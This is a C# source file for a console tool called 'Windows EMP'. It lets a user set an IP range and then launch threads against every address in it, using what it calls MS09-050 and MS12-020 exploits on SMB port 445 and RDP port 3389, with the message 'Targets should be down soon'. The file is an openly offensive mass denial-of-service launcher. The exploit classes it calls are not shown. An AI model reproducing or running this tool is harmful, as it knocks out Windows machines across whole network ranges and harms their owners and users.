﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

//TODO: Convert threads to tasks so we can check how many PCs fucking keeled over and died
namespace WindowsEMPCSharp
{
    class EMP
    {
        private static int windowHeight, windowWidth;
        private static string range = "UNSET!";

        static void Main()
        {
            windowHeight = Console.WindowHeight;
            windowWidth = Console.WindowWidth;
            Thread windowWatchdog = new Thread(unused => KeepWindowsUnchanged());
            windowWatchdog.Start();
            Console.Title = "Windows EMP | uncodable#9463";
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("                                                  ╔═╗╔╗╔╗╔═╗" +
                            "\n                                                  ║╣ ║╚╝║║═╝" +
                            "\n                                                  ╚══╝  ╚╝\n\n" +
                            "                          [+]════════════════════════[+]══════════════════════[+]\n" +
                            "                           ║ [1] - Select an IP range ║ [2] - Launch exploit   ║\n" +
                            "                          [+]════════════════════════[+]══════════════════════[+]\n");
        recovery:
            try
            {
                while (true)
                {
                    Console.Write("[ > ] ");
                    string input = Console.ReadLine();
                    switch (int.Parse(input))
                    {
                        case 1:
                            {
                                Console.Write("[ Select an IP range > ] ");
                                string rangeInput = Console.ReadLine();
                                if (rangeInput == "")
                                {
                                    Console.WriteLine("Set range: " + range);
                                    break;
                                }
                                if (!rangeInput.Contains("x"))
                                {
                                    Console.WriteLine("Invalid IP range!");
                                }
                                else
                                {
                                    range = rangeInput;
                                    Console.WriteLine("IP range: " + range);
                                }
                                break;
                            }
                        case 2:
                            {
                                Console.WriteLine("Scanning through ip range (" + range + ")");
                                Thread ms09_050;
                                Thread ms12_020;
                                for (int i = 0; i <= 255; i++)
                                {
                                    string host = range.Replace("x", i + "");
                                    ms09_050 = new Thread(unused => MS09_050.Run(host, 445));
                                    ms12_020 = new Thread(unused => MS12_020.Run(host, 3389));
                                    ms09_050.Start();
                                    ms12_020.Start();
                                }
                                Console.WriteLine("All threads are running. Targets should be down soon...");
                                break;
                            }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("An error has occured. Maybe your input is invalid? Or, a problem occured with threads? " + e.Message);
                goto recovery;
            }
        }

        static void KeepWindowsUnchanged()
        {
            while (true)
            {
                try
                {
                    if (Console.WindowWidth != windowWidth)
                    {
                        Console.WindowWidth = windowWidth;
                    }
                    if (Console.WindowHeight != windowHeight)
                    {
                        Console.WindowHeight = windowHeight;
                    }
                }
                catch (Exception) { }
            }
        }
    }
}